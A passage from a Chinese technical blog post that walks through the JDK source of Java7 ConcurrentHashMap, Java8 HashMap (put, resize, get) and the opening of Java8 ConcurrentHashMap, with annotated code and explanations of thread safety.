(HashEntry&lt;K,V&gt; p = e; p != lastRun; p = p.next) &#123;</span><br><span class="line">                    <span class="type">V</span> <span class="variable">v</span> <span class="operator">=</span> p.value;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> p.hash;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> h &amp; sizeMask;</span><br><span class="line">                    HashEntry&lt;K,V&gt; n = newTable[k];</span><br><span class="line">                    newTable[k] = <span class="keyword">new</span> <span class="title class_">HashEntry</span>&lt;K,V&gt;(h, p.key, v, n);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将新来的 node 放到新数组中刚刚的 两个链表之一 的 头部</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">nodeIndex</span> <span class="operator">=</span> node.hash &amp; sizeMask; <span class="comment">// add the new node</span></span><br><span class="line">    node.setNext(newTable[nodeIndex]);</span><br><span class="line">    newTable[nodeIndex] = node;</span><br><span class="line">    table = newTable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的扩容比之前的 HashMap 要复杂一些，代码难懂一点。上面有两个挨着的 for 循环，第一个 for 有什么用呢？</p><p>仔细一看发现，如果没有第一个 for 循环，也是可以工作的，但是，这个 for 循环下来，如果 lastRun 的后面还有比较多的节点，那么这次就是值得的。因为我们只需要克隆 lastRun 前面的节点，后面的一串节点跟着 lastRun 走就是了，不需要做任何操作。</p><p>我觉得 Doug Lea 的这个想法也是挺有意思的，不过比较坏的情况就是每次 lastRun 都是链表的最后一个元素或者很靠后的元素，那么这次遍历就有点浪费了。<strong>不过 Doug Lea 也说了，根据统计，如果使用默认的阈值，大约只有 1&#x2F;6 的节点需要克隆</strong>。</p><h3><span id="get-过程分析">get 过程分析</span></h3><p>相对于 put 来说，get 真的不要太简单。</p><ol><li>计算 hash 值，找到 segment 数组中的具体位置，或我们前面用的“槽”</li><li>槽中也是一个数组，根据 hash 找到数组中具体的位置</li><li>到这里是链表了，顺着链表进行查找即可</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    Segment&lt;K,V&gt; s; <span class="comment">// manually integrate access methods to reduce overhead</span></span><br><span class="line">    HashEntry&lt;K,V&gt;[] tab;</span><br><span class="line">    <span class="comment">// 1. hash 值</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">long</span> <span class="variable">u</span> <span class="operator">=</span> (((h &gt;&gt;&gt; segmentShift) &amp; segmentMask) &lt;&lt; SSHIFT) + SBASE;</span><br><span class="line">    <span class="comment">// 2. 根据 hash 找到对应的 segment</span></span><br><span class="line">    <span class="keyword">if</span> ((s = (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(segments, u)) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">        (tab = s.table) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 3. 找到segment 内部数组相应位置的链表，遍历</span></span><br><span class="line">        <span class="keyword">for</span> (HashEntry&lt;K,V&gt; e = (HashEntry&lt;K,V&gt;) UNSAFE.getObjectVolatile</span><br><span class="line">                 (tab, ((<span class="type">long</span>)(((tab.length - <span class="number">1</span>) &amp; h)) &lt;&lt; TSHIFT) + TBASE);</span><br><span class="line">             e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">            K k;</span><br><span class="line">            <span class="keyword">if</span> ((k = e.key) == key || (e.hash == h &amp;&amp; key.equals(k)))</span><br><span class="line">                <span class="keyword">return</span> e.value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="并发问题分析">并发问题分析</span></h3><p>现在我们已经说完了 put 过程和 get 过程，我们可以看到 get 过程中是没有加锁的，那自然我们就需要去考虑并发问题。</p><p>添加节点的操作 put 和删除节点的操作 remove 都是要加 segment 上的独占锁的，所以它们之间自然不会有问题，我们需要考虑的问题就是 get 的时候在同一个 segment 中发生了 put 或 remove 操作。</p><ol><li><p>put 操作的线程安全性。</p><ol><li>初始化槽，这个我们之前就说过了，使用了 CAS 来初始化 Segment 中的数组。</li><li>添加节点到链表的操作是插入到表头的，所以，如果这个时候 get 操作在链表遍历的过程已经到了中间，是不会影响的。当然，另一个并发问题就是 get 操作在 put 之后，需要保证刚刚插入表头的节点被读取，这个依赖于 setEntryAt 方法中使用的 UNSAFE.putOrderedObject。</li><li>扩容。扩容是新创建了数组，然后进行迁移数据，最后面将 newTable 设置给属性 table。所以，如果 get 操作此时也在进行，那么也没关系，如果 get 先行，那么就是在旧的 table 上做查询操作；而 put 先行，那么 put 操作的可见性保证就是 table 使用了 volatile 关键字。</li></ol></li><li><p>remove 操作的线程安全性。</p><p>remove 操作我们没有分析源码，所以这里说的读者感兴趣的话还是需要到源码中去求实一下的。</p><p>get 操作需要遍历链表，但是 remove 操作会”破坏”链表。</p><p>如果 remove 破坏的节点 get 操作已经过去了，那么这里不存在任何问题。</p><p>如果 remove 先破坏了一个节点，分两种情况考虑。  1、如果此节点是头结点，那么需要将头结点的 next 设置为数组该位置的元素，table 虽然使用了 volatile 修饰，但是 volatile 并不能提供数组内部操作的可见性保证，所以源码中使用了 UNSAFE 来操作数组，请看方法 setEntryAt。2、如果要删除的节点不是头结点，它会将要删除节点的后继节点接到前驱节点中，这里的并发保证就是 next 属性是 volatile 的。</p></li></ol><h2><span id="java8-hashmap">Java8 HashMap</span></h2><p>Java8 对 HashMap 进行了一些修改，最大的不同就是利用了红黑树，所以其由 <strong>数组+链表+红黑树</strong> 组成。</p><p>根据 Java7 HashMap 的介绍，我们知道，查找的时候，根据 hash 值我们能够快速定位到数组的具体下标，但是之后的话，需要顺着链表一个个比较下去才能找到我们需要的，时间复杂度取决于链表的长度，为 **O(n)**。</p><p>为了降低这部分的开销，在 Java8 中，当链表中的元素达到了 8 个时，会将链表转换为红黑树，在这些位置进行查找的时候可以降低时间复杂度为 **O(logN)**。</p><p>来一张图简单示意一下吧：</p><p><img src="https://www.javadoop.com/blogimages/map/2.png" alt="2"></p><blockquote><p>注意，上图是示意图，主要是描述结构，不会达到这个状态的，因为这么多数据的时候早就扩容了。</p></blockquote><p>下面，我们还是用代码来介绍吧，个人感觉，Java8 的源码可读性要差一些，不过精简一些。</p><p>Java7 中使用 Entry 来代表每个 HashMap 中的数据节点，Java8 中使用 <strong>Node</strong>，基本没有区别，都是 key，value，hash 和 next 这四个属性，不过，Node 只能用于链表的情况，红黑树的情况需要使用 <strong>TreeNode</strong>。</p><p>我们根据数组元素中，第一个节点数据类型是 Node 还是 TreeNode 来判断该位置下是链表还是红黑树的。</p><h3><span id="put-过程分析">put 过程分析</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第四个参数 onlyIfAbsent 如果是 true，那么只有在不存在该 key 时才会进行 put 操作</span></span><br><span class="line"><span class="comment">// 第五个参数 evict 我们这里不关心</span></span><br><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">               <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="type">int</span> n, i;</span><br><span class="line">    <span class="comment">// 第一次 put 值的时候，会触发下面的 resize()，类似 java7 的第一次 put 也要初始化数组长度</span></span><br><span class="line">    <span class="comment">// 第一次 resize 和后续的扩容有些不一样，因为这次是数组从 null 初始化到默认的 16 或自定义的初始容量</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="comment">// 找到具体的数组下标，如果此位置没有值，那么直接初始化一下 Node 并放置在这个位置就可以了</span></span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="literal">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">// 数组该位置有数据</span></span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="comment">// 首先，判断该位置的第一个数据和我们要插入的数据，key 是不是&quot;相等&quot;，如果是，取出这个节点</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        <span class="comment">// 如果该节点是代表红黑树的节点，调用红黑树的插值方法，本文不展开说红黑树</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="built_in">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 到这里，说明数组该位置上是一个链表</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="comment">// 插入到链表的最后面(Java7 是插入到链表的最前面)</span></span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                    <span class="comment">// TREEIFY_THRESHOLD 为 8，所以，如果新插入的值是链表中的第 8 个</span></span><br><span class="line">                    <span class="comment">// 会触发下面的 treeifyBin，也就是将链表转换为红黑树</span></span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果在该链表中找到了&quot;相等&quot;的 key(== 或 equals)</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="comment">// 此时 break，那么 e 为链表中[与要插入的新值的 key &quot;相等&quot;]的 node</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// e!=null 说明存在旧值的key与要插入的key&quot;相等&quot;</span></span><br><span class="line">        <span class="comment">// 对于我们分析的put操作，下面这个 if 其实就是进行 &quot;值覆盖&quot;，然后返回旧值</span></span><br><span class="line">        <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="literal">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="comment">// 如果 HashMap 由于新插入这个值导致 size 已经超过了阈值，需要进行扩容</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和 Java7 稍微有点不一样的地方就是，Java7 是先扩容后插入新值的，Java8 先插值再扩容，不过这个不重要。</p><h4><span id="数组扩容">数组扩容</span></h4><p>resize() 方法用于<strong>初始化数组</strong>或<strong>数组扩容</strong>，每次扩容后，容量为原来的 2 倍，并进行数据迁移。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] oldTab = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldCap</span> <span class="operator">=</span> (oldTab == <span class="literal">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldThr</span> <span class="operator">=</span> threshold;</span><br><span class="line">    <span class="type">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123; <span class="comment">// 对应数组扩容</span></span><br><span class="line">        <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">            threshold = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span> oldTab;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将数组大小扩大一倍</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                 oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">            <span class="comment">// 将阈值扩大一倍</span></span><br><span class="line">            newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>) <span class="comment">// 对应使用 new HashMap(int initialCapacity) 初始化后，第一次 put 的时候</span></span><br><span class="line">        newCap = oldThr;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">// 对应使用 new HashMap() 初始化后，第一次 put 的时候</span></span><br><span class="line">        newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class="line">        newThr = (<span class="type">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)newCap * loadFactor;</span><br><span class="line">        newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="type">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                  (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">    threshold = newThr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用新的数组大小初始化新的数组</span></span><br><span class="line">    Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[newCap];</span><br><span class="line">    table = newTab; <span class="comment">// 如果是初始化数组，到这里就结束了，返回 newTab 即可</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (oldTab != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 开始遍历原数组，进行数据迁移。</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">            Node&lt;K,V&gt; e;</span><br><span class="line">            <span class="keyword">if</span> ((e = oldTab[j]) != <span class="literal">null</span>) &#123;</span><br><span class="line">                oldTab[j] = <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">// 如果该数组位置上只有单个元素，那就简单了，简单迁移这个元素就可以了</span></span><br><span class="line">                <span class="keyword">if</span> (e.next == <span class="literal">null</span>)</span><br><span class="line">                    newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">                <span class="comment">// 如果是红黑树，具体我们就不展开了</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                    ((TreeNode&lt;K,V&gt;)e).split(<span class="built_in">this</span>, newTab, j, oldCap);</span><br><span class="line">                <span class="keyword">else</span> &#123; </span><br><span class="line">                    <span class="comment">// 这块是处理链表的情况，</span></span><br><span class="line">                    <span class="comment">// 需要将此链表拆成两个链表，放到新的数组中，并且保留原来的先后顺序</span></span><br><span class="line">                    <span class="comment">// loHead、loTail 对应一条链表，hiHead、hiTail 对应另一条链表，代码还是比较简单的</span></span><br><span class="line">                    Node&lt;K,V&gt; loHead = <span class="literal">null</span>, loTail = <span class="literal">null</span>;</span><br><span class="line">                    Node&lt;K,V&gt; hiHead = <span class="literal">null</span>, hiTail = <span class="literal">null</span>;</span><br><span class="line">                    Node&lt;K,V&gt; next;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        next = e.next;</span><br><span class="line">                        <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (loTail == <span class="literal">null</span>)</span><br><span class="line">                                loHead = e;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                loTail.next = e;</span><br><span class="line">                            loTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (hiTail == <span class="literal">null</span>)</span><br><span class="line">                                hiHead = e;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                hiTail.next = e;</span><br><span class="line">                            hiTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">while</span> ((e = next) != <span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">if</span> (loTail != <span class="literal">null</span>) &#123;</span><br><span class="line">                        loTail.next = <span class="literal">null</span>;</span><br><span class="line">                        <span class="comment">// 第一条链表</span></span><br><span class="line">                        newTab[j] = loHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (hiTail != <span class="literal">null</span>) &#123;</span><br><span class="line">                        hiTail.next = <span class="literal">null</span>;</span><br><span class="line">                        <span class="comment">// 第二条链表的新的位置是 j + oldCap，这个很好理解</span></span><br><span class="line">                        newTab[j + oldCap] = hiHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newTab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="get-过程分析">get 过程分析</span></h3><p>相对于 put 来说，get 真的太简单了。</p><ol><li>计算 key 的 hash 值，根据 hash 值找到对应数组下标: hash &amp; (length-1)</li><li>判断数组该位置处的元素是否刚好就是我们要找的，如果不是，走第三步</li><li>判断该元素类型是否是 TreeNode，如果是，用红黑树的方法取数据，如果不是，走第四步</li><li>遍历链表，直到找到相等(&#x3D;&#x3D;或equals)的 key</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="keyword">return</span> (e = getNode(hash(key), key)) == <span class="literal">null</span> ? <span class="literal">null</span> : e.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title function_">getNode</span><span class="params">(<span class="type">int</span> hash, Object key)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; <span class="type">int</span> n; K k;</span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="literal">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (first = tab[(n - <span class="number">1</span>) &amp; hash]) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 判断第一个节点是不是就是需要的</span></span><br><span class="line">        <span class="keyword">if</span> (first.hash == hash &amp;&amp; <span class="comment">// always check first node</span></span><br><span class="line">            ((k = first.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="keyword">return</span> first;</span><br><span class="line">        <span class="keyword">if</span> ((e = first.next) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 判断是否是红黑树</span></span><br><span class="line">            <span class="keyword">if</span> (first <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                <span class="keyword">return</span> ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 链表遍历</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">return</span> e;</span><br><span class="line">            &#125; <span class="keyword">while</span> ((e = e.next) != <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="java8-concurrenthashmap">Java8 ConcurrentHashMap</span></h2><p>Java7 中实现的 ConcurrentHashMap 说实话还是比较复杂的，Java8 对 ConcurrentHashMap 进行了比较大的改动。建议读者可以参考 Java8 中 HashMap 相对于 Java7 HashMap 的改动，对于 ConcurrentHashMap，Java8 也引入了红黑树。</p><p><strong>说实话，Java8 ConcurrentHashMap 源码真心不简单，最难的在于扩容，数据迁移操作不容易看懂。</strong></p><p>我们先用一个示意图来描述下其结构：</p><p><img src="https://www.javadoop.com/blogimages/map/4.png" alt="4"></p><p>结构上和 Java8 的 HashMap 基本上一样，不过它要保证线程安全性，所以在源码上确实要复杂一些。</p><h3><span id="初始化">初始化</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这构造函数里，什么都不干</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ConcurrentHashMap</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConcurrentHashMap</span><span class="params">(<span class="type">int</span> initialCapacity)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((initialCapacity &gt;= (MAXIMUM_CAPACITY &gt;&gt;&gt; <span class="number">1</span>)) ?</span><br><span class="line">               MAXIMUM_CAPACITY :</span><br><span class="line">               tableSizeFor(initialCapacity + (initialCapacity &gt;&gt;&gt; <span class="number">1</span>) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">this</span>.sizeCtl = cap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个初始化方法有点意思，通过提供初始容量，计算了 sizeCtl，sizeCtl &#x3D; 【 (1.5 * initialCapacity + 1)，然后向上取最近的 2 的 n 次方】。如 initialCapacity 为 10，那么得到 sizeCtl 为 16，如果 initialCapacity 为 11，得到 sizeCtl 为 32。</p><p>sizeCtl 这个属性使用的场景很多，不过只要跟着文章的思路来，就不会被它搞晕了。</p><p>如果你爱折腾，也可以看下另一个有三个参数的构造方法，这里我就不说了，大部分时候，我们会使用无参构造函数进行实例化，我们也按照这个思路来进行源码分析吧。</p><h3><span id="put-过程分析">put 过程分析</span></h3><p>仔细地一行一行代码看下去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(key, value, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 